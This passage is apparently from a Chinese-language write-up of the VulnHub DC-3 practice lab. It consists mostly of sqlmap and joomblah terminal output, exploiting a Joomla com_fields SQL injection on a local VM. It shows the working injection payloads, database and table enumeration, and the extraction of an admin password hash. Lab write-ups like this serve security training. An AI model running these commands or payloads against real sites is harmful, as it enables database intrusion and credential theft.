&quot;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]        ___       __H__                                                                                  ___ ___[(]_____ ___ ___  &#123;1.7.2#stable&#125;                                                     |_ -| . [(]     | .&#x27;| . |                                                                    |___|_  [.]_|_|_|__,|  _|                                                                          |_|V...       |_|   https://sqlmap.org                                                 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 15:08:09 /2023-05-31/[15:08:09] [INFO] fetched random HTTP User-Agent header value &#x27;Opera/9.10 (X11; Linux i386; U; en)&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;                                [15:08:10] [INFO] testing connection to the target URL[15:08:10] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testsyou have not declared cookie(s), while server wants to set its own (&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=onljp83m4d8...cvdtmls307&#x27;). Do you want to use those [Y/n] [15:08:16] [INFO] checking if the target is protected by some kind of WAF/IPS[15:08:16] [INFO] testing if the target URL content is stable[15:08:16] [INFO] target URL content is stable[15:08:16] [INFO] heuristic (basic) test shows that GET parameter &#x27;list[fullordering]&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)[15:08:16] [INFO] testing for SQL injection on GET parameter &#x27;list[fullordering]&#x27;it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] [15:08:17] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;[15:08:18] [WARNING] reflective value(s) found and filtering out[15:08:21] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause&#x27;[15:08:23] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (NOT)&#x27;[15:08:25] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)&#x27;                                                                                         [15:08:27] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (subquery - comment)&#x27;                                                                                          [15:08:29] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause (comment)&#x27;[15:08:30] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (comment)&#x27;[15:08:31] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - comment)&#x27;[15:08:32] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;[15:08:32] [INFO] testing &#x27;Boolean-based blind - Parameter replace (DUAL)&#x27;[15:08:32] [INFO] testing &#x27;Boolean-based blind - Parameter replace (DUAL - original value)&#x27;[15:08:33] [INFO] testing &#x27;Boolean-based blind - Parameter replace (CASE)&#x27;[15:08:33] [INFO] testing &#x27;Boolean-based blind - Parameter replace (CASE - original value)&#x27;[15:08:33] [INFO] testing &#x27;HAVING boolean-based blind - WHERE, GROUP BY clause&#x27;[15:08:35] [INFO] testing &#x27;Generic inline queries&#x27;[15:08:35] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;[15:08:36] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;[15:08:37] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#x27;                                                                                         [15:08:38] [INFO] testing &#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27;                                                                                  [15:08:40] [INFO] testing &#x27;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#x27;                                                                         [15:08:42] [INFO] testing &#x27;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#x27;                                                                          [15:08:44] [INFO] testing &#x27;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#x27;                                                                              [15:08:46] [INFO] testing &#x27;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#x27;                                                                               [15:08:48] [INFO] testing &#x27;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#x27;                                                                         [15:08:50] [INFO] testing &#x27;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#x27;                                                                          [15:08:51] [INFO] testing &#x27;MySQL boolean-based blind - Parameter replace (MAKE_SET)&#x27;[15:08:51] [INFO] testing &#x27;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#x27;                                                                                     [15:08:51] [INFO] testing &#x27;MySQL boolean-based blind - Parameter replace (ELT)&#x27;[15:08:52] [INFO] testing &#x27;MySQL boolean-based blind - Parameter replace (ELT - original value)&#x27;                                                                                          [15:08:52] [INFO] testing &#x27;MySQL boolean-based blind - Parameter replace (bool*int)&#x27;[15:08:52] [INFO] testing &#x27;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#x27;                                                                                     [15:08:52] [INFO] testing &#x27;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#x27;[15:08:52] [INFO] testing &#x27;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#x27;                                                                                 [15:08:52] [INFO] testing &#x27;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#x27;[15:08:52] [INFO] testing &#x27;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#x27;                                                                                  [15:08:52] [INFO] testing &#x27;MySQL &gt;= 5.0 boolean-based blind - Stacked queries&#x27;[15:08:53] [INFO] testing &#x27;MySQL &lt; 5.0 boolean-based blind - Stacked queries&#x27;[15:08:53] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;                                                                   [15:08:55] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;                                                                                        [15:08:56] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;                                                                               [15:08:57] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;[15:08:59] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;                                                                       [15:09:00] [INFO] testing &#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;[15:09:01] [INFO] testing &#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;                                                                       [15:09:03] [INFO] testing &#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;[15:09:04] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                             [15:09:06] [INFO] testing &#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                              [15:09:07] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;                                                                      [15:09:09] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;                                                                       [15:09:10] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;                                                                         [15:09:12] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;                                                                          [15:09:13] [INFO] testing &#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                             [15:09:14] [INFO] testing &#x27;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#x27;[15:09:16] [INFO] testing &#x27;MySQL OR error-based - WHERE or HAVING clause (FLOOR)&#x27;[15:09:16] [INFO] testing &#x27;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;[15:09:17] [INFO] testing &#x27;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&#x27;[15:09:17] [INFO] testing &#x27;MySQL &gt;= 5.5 error-based - Parameter replace (EXP)&#x27;[15:09:17] [INFO] testing &#x27;MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)&#x27;[15:09:17] [INFO] testing &#x27;MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)&#x27;[15:09:17] [INFO] testing &#x27;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#x27;[15:09:17] [INFO] testing &#x27;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#x27;[15:09:17] [INFO] GET parameter &#x27;list[fullordering]&#x27; is &#x27;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#x27; injectable                                                             [15:09:17] [INFO] testing &#x27;MySQL inline queries&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt; 5.0.12 AND time-based blind (heavy query)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt; 5.0.12 OR time-based blind (heavy query)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt; 5.0.12 AND time-based blind (heavy query - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt; 5.0.12 OR time-based blind (heavy query - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL AND time-based blind (ELT)&#x27;[15:09:18] [INFO] testing &#x27;MySQL OR time-based blind (ELT)&#x27;[15:09:18] [INFO] testing &#x27;MySQL AND time-based blind (ELT - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL OR time-based blind (ELT - comment)&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;                                                                                [15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;                                                                      [15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 time-based blind - Parameter replace&#x27;[15:09:18] [INFO] testing &#x27;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#x27;                                                                                           [15:09:29] [INFO] GET parameter &#x27;list[fullordering]&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#x27; injectable                                       [15:09:29] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;[15:09:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[15:09:29] [INFO] testing &#x27;Generic UNION query (random number) - 1 to 20 columns&#x27;[15:09:30] [INFO] testing &#x27;Generic UNION query (NULL) - 21 to 40 columns&#x27;[15:09:30] [INFO] testing &#x27;Generic UNION query (random number) - 21 to 40 columns&#x27;[15:09:31] [INFO] testing &#x27;Generic UNION query (NULL) - 41 to 60 columns&#x27;[15:09:31] [INFO] testing &#x27;Generic UNION query (random number) - 41 to 60 columns&#x27;[15:09:32] [INFO] testing &#x27;Generic UNION query (NULL) - 61 to 80 columns&#x27;[15:09:32] [INFO] testing &#x27;Generic UNION query (random number) - 61 to 80 columns&#x27;[15:09:33] [INFO] testing &#x27;Generic UNION query (NULL) - 81 to 100 columns&#x27;[15:09:33] [INFO] testing &#x27;Generic UNION query (random number) - 81 to 100 columns&#x27;[15:09:34] [INFO] testing &#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;[15:09:34] [INFO] testing &#x27;MySQL UNION query (random number) - 1 to 20 columns&#x27;[15:09:35] [INFO] testing &#x27;MySQL UNION query (NULL) - 21 to 40 columns&#x27;[15:09:35] [INFO] testing &#x27;MySQL UNION query (random number) - 21 to 40 columns&#x27;[15:09:36] [INFO] testing &#x27;MySQL UNION query (NULL) - 41 to 60 columns&#x27;[15:09:36] [INFO] testing &#x27;MySQL UNION query (random number) - 41 to 60 columns&#x27;[15:09:37] [INFO] testing &#x27;MySQL UNION query (NULL) - 61 to 80 columns&#x27;[15:09:38] [INFO] testing &#x27;MySQL UNION query (random number) - 61 to 80 columns&#x27;[15:09:38] [INFO] testing &#x27;MySQL UNION query (NULL) - 81 to 100 columns&#x27;[15:09:39] [INFO] testing &#x27;MySQL UNION query (random number) - 81 to 100 columns&#x27;GET parameter &#x27;list[fullordering]&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 2716 HTTP(s) requests:---Parameter: list[fullordering] (GET)    Type: error-based    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8824,CONCAT(0x2e,0x717a627071,(SELECT (ELT(8824=8824,1))),0x716a7a6b71),6230))    Type: time-based blind    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8632 FROM (SELECT(SLEEP(5)))WmsI)---[15:09:51] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)web application technology: Apache 2.4.18back-end DBMS: MySQL &gt;= 5.1[15:09:51] [INFO] fetching database names[15:09:51] [INFO] retrieved: &#x27;information_schema&#x27;[15:09:51] [INFO] retrieved: &#x27;joomladb&#x27;[15:09:51] [INFO] retrieved: &#x27;mysql&#x27;[15:09:51] [INFO] retrieved: &#x27;performance_schema&#x27;[15:09:51] [INFO] retrieved: &#x27;sys&#x27;available databases [5]:[*] information_schema[*] joomladb[*] mysql[*] performance_schema[*] sys[15:09:51] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 2675 times[15:09:51] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;                                                                               [*] ending @ 15:09:51 /2023-05-31/                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo sqlmap -u &quot;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --random-agent -D joomladb --tables        ___       __H__                                                                                  ___ ___[(]_____ ___ ___  &#123;1.7.2#stable&#125;                                                     |_ -| . [.]     | .&#x27;| . |                                                                    |___|_  [,]_|_|_|__,|  _|                                                                          |_|V...       |_|   https://sqlmap.org                                                 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 15:10:42 /2023-05-31/[15:10:42] [INFO] fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;[15:10:42] [INFO] resuming back-end DBMS &#x27;mysql&#x27; [15:10:42] [INFO] testing connection to the target URL[15:10:42] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testsyou have not declared cookie(s), while server wants to set its own (&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=gdur4j5rk68...ce25ghi8c2&#x27;). Do you want to use those [Y/n] sqlmap resumed the following injection point(s) from stored session:---Parameter: list[fullordering] (GET)    Type: error-based    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8824,CONCAT(0x2e,0x717a627071,(SELECT (ELT(8824=8824,1))),0x716a7a6b71),6230))    Type: time-based blind    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8632 FROM (SELECT(SLEEP(5)))WmsI)---[15:10:44] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)web application technology: Apache 2.4.18back-end DBMS: MySQL &gt;= 5.1[15:10:44] [INFO] fetching tables for database: &#x27;joomladb&#x27;[15:10:44] [INFO] retrieved: &#x27;#__assets&#x27;[15:10:45] [INFO] retrieved: &#x27;#__associations&#x27;[15:10:45] [INFO] retrieved: &#x27;#__banner_clients&#x27;[15:10:45] [INFO] retrieved: &#x27;#__banner_tracks&#x27;[15:10:45] [INFO] retrieved: &#x27;#__banners&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_admin&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_books&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_comments&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_locations&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_mediafiles&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_message_typ&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_podcast&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_series&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_servers&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_studies&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_studytopics&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_teachers&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_templatecod&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_templates&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_timeset&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_topics&#x27;[15:10:45] [INFO] retrieved: &#x27;#__bsms_update&#x27;[15:10:45] [INFO] retrieved: &#x27;#__categories&#x27;[15:10:45] [INFO] retrieved: &#x27;#__contact_details&#x27;[15:10:45] [INFO] retrieved: &#x27;#__content&#x27;[15:10:45] [INFO] retrieved: &#x27;#__content_frontpag&#x27;[15:10:45] [INFO] retrieved: &#x27;#__content_rating&#x27;[15:10:45] [INFO] retrieved: &#x27;#__content_types&#x27;[15:10:45] [INFO] retrieved: &#x27;#__contentitem_tag_&#x27;[15:10:45] [INFO] retrieved: &#x27;#__core_log_searche&#x27;[15:10:45] [INFO] retrieved: &#x27;#__extensions&#x27;[15:10:46] [INFO] retrieved: &#x27;#__fields&#x27;[15:10:46] [INFO] retrieved: &#x27;#__fields_categorie&#x27;[15:10:46] [INFO] retrieved: &#x27;#__fields_groups&#x27;[15:10:46] [INFO] retrieved: &#x27;#__fields_values&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_filters&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_links_ter&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_taxonomy&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_taxonomy_&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_terms&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_terms_com&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_tokens&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_tokens_ag&#x27;[15:10:46] [INFO] retrieved: &#x27;#__finder_types&#x27;[15:10:46] [INFO] retrieved: &#x27;#__jbsbackup_timese&#x27;[15:10:46] [INFO] retrieved: &#x27;#__jbspodcast_times&#x27;[15:10:46] [INFO] retrieved: &#x27;#__languages&#x27;[15:10:46] [INFO] retrieved: &#x27;#__menu&#x27;[15:10:46] [INFO] retrieved: &#x27;#__menu_types&#x27;[15:10:47] [INFO] retrieved: &#x27;#__messages&#x27;[15:10:47] [INFO] retrieved: &#x27;#__messages_cfg&#x27;[15:10:47] [INFO] retrieved: &#x27;#__modules&#x27;[15:10:47] [INFO] retrieved: &#x27;#__modules_menu&#x27;[15:10:47] [INFO] retrieved: &#x27;#__newsfeeds&#x27;[15:10:47] [INFO] retrieved: &#x27;#__overrider&#x27;[15:10:47] [INFO] retrieved: &#x27;#__postinstall_mess&#x27;[15:10:47] [INFO] retrieved: &#x27;#__redirect_links&#x27;[15:10:47] [INFO] retrieved: &#x27;#__schemas&#x27;[15:10:47] [INFO] retrieved: &#x27;#__session&#x27;[15:10:47] [INFO] retrieved: &#x27;#__tags&#x27;[15:10:47] [INFO] retrieved: &#x27;#__template_styles&#x27;[15:10:47] [INFO] retrieved: &#x27;#__ucm_base&#x27;[15:10:47] [INFO] retrieved: &#x27;#__ucm_content&#x27;[15:10:47] [INFO] retrieved: &#x27;#__ucm_history&#x27;[15:10:47] [INFO] retrieved: &#x27;#__update_sites&#x27;[15:10:47] [INFO] retrieved: &#x27;#__update_sites_ext&#x27;[15:10:47] [INFO] retrieved: &#x27;#__updates&#x27;[15:10:47] [INFO] retrieved: &#x27;#__user_keys&#x27;[15:10:47] [INFO] retrieved: &#x27;#__user_notes&#x27;[15:10:47] [INFO] retrieved: &#x27;#__user_profiles&#x27;[15:10:47] [INFO] retrieved: &#x27;#__user_usergroup_m&#x27;[15:10:47] [INFO] retrieved: &#x27;#__usergroups&#x27;[15:10:47] [INFO] retrieved: &#x27;#__users&#x27;[15:10:47] [INFO] retrieved: &#x27;#__utf8_conversion&#x27;[15:10:47] [INFO] retrieved: &#x27;#__viewlevels&#x27;Database: joomladb[76 tables]+---------------------+| #__assets           || #__associations     || #__banner_clients   || #__banner_tracks    || #__banners          || #__bsms_admin       || #__bsms_books       || #__bsms_comments    || #__bsms_locations   || #__bsms_mediafiles  || #__bsms_message_typ || #__bsms_podcast     || #__bsms_series      || #__bsms_servers     || #__bsms_studies     || #__bsms_studytopics || #__bsms_teachers    || #__bsms_templatecod || #__bsms_templates   || #__bsms_timeset     || #__bsms_topics      || #__bsms_update      || #__categories       || #__contact_details  || #__content_frontpag || #__content_rating   || #__content_types    || #__content          || #__contentitem_tag_ || #__core_log_searche || #__extensions       || #__fields_categorie || #__fields_groups    || #__fields_values    || #__fields           || #__finder_filters   || #__finder_links_ter || #__finder_links     || #__finder_taxonomy_ || #__finder_taxonomy  || #__finder_terms_com || #__finder_terms     || #__finder_tokens_ag || #__finder_tokens    || #__finder_types     || #__jbsbackup_timese || #__jbspodcast_times || #__languages        || #__menu_types       || #__menu             || #__messages_cfg     || #__messages         || #__modules_menu     || #__modules          || #__newsfeeds        || #__overrider        || #__postinstall_mess || #__redirect_links   || #__schemas          || #__session          || #__tags             || #__template_styles  || #__ucm_base         || #__ucm_content      || #__ucm_history      || #__update_sites_ext || #__update_sites     || #__updates          || #__user_keys        || #__user_notes       || #__user_profiles    || #__user_usergroup_m || #__usergroups       || #__users            || #__utf8_conversion  || #__viewlevels       |+---------------------+[15:10:47] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 93 times[15:10:47] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;                                                                               [*] ending @ 15:10:47 /2023-05-31/\n\n我们可以发现可以把joomladb中的表给查出来。\n但是如果此时你开开心心的想着去查#__users表中的列名你就会发现，根本查不出来。为什么呢？原因在于joomla配置文件里可以设置数据库中表名前面带有一个固定的前缀，所以实际上表名应该是Setprefix_users，然而我们看不到配置文件，显然猜不出来管理员到底设置了什么前缀。所以这条路只能作罢。\nJoomblah其实joomla有专门的漏洞利用脚本：joomblah 我们可以直接用这个脚本来对joomla进行利用。\n┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ python3 joomblah.py http://192.168.56.111                                                                                                                                                                                               .---.    .-&#x27;&#x27;&#x27;-.        .-&#x27;&#x27;&#x27;-.                                             |   |   &#x27;   _    \\     &#x27;   _    \\                            .---.           &#x27;---&#x27; /   /` &#x27;.   \\  /   /` &#x27;.   \\  __  __   ___   /|        |   |            .                                                                           .---..   |     \\  &#x27; .   |     \\  &#x27; |  |/  `.&#x27;   `. ||        |   |          .&#x27;|                                                                           |   ||   &#x27;      |  &#x27;|   &#x27;      |  &#x27;|   .-.  .-.   &#x27;||        |   |         &lt;  |                                                                           |   |\\    \\     / / \\    \\     / / |  |  |  |  |  |||  __    |   |    __    | |                                                                           |   | `.   ` ..&#x27; /   `.   ` ..&#x27; /  |  |  |  |  |  |||/&#x27;__ &#x27;. |   | .:--.&#x27;.  | | .&#x27;&#x27;&#x27;-.                                                                 |   |    &#x27;-...-&#x27;`       &#x27;-...-&#x27;`   |  |  |  |  |  ||:/`  &#x27;. &#x27;|   |/ |   \\ | | |/.&#x27;&#x27;&#x27;. \\                                                                 |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |                                                                 |   |                              |__|  |__|  |__|||\\    / &#x27;|   | .&#x27;.&#x27;&#x27;| | | |     | |                                                          __.&#x27;   &#x27;                                              |/&#x27;..&#x27; / &#x27;---&#x27;/ /   | |_| |     | |   |      &#x27;                                               &#x27;  `&#x27;-&#x27;`       \\ \\._,\\ &#x27;/| &#x27;.    | &#x27;.                                                         |____.&#x27;                                                                `--&#x27;  `&quot; &#x27;---&#x27;   &#x27;---&#x27;                                                                                              [-] Fetching CSRF token [-] Testing SQLi  -  Found table: d8uea_users  -  Found table: users  -  Extracting users from d8uea_users [$] Found user [&#x27;629&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;, &#x27;freddy@norealaddress.net&#x27;, &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;, &#x27;&#x27;, &#x27;&#x27;]  -  Extracting sessions from d8uea_session  -  Extracting users from users  -  Extracting sessions from session                                     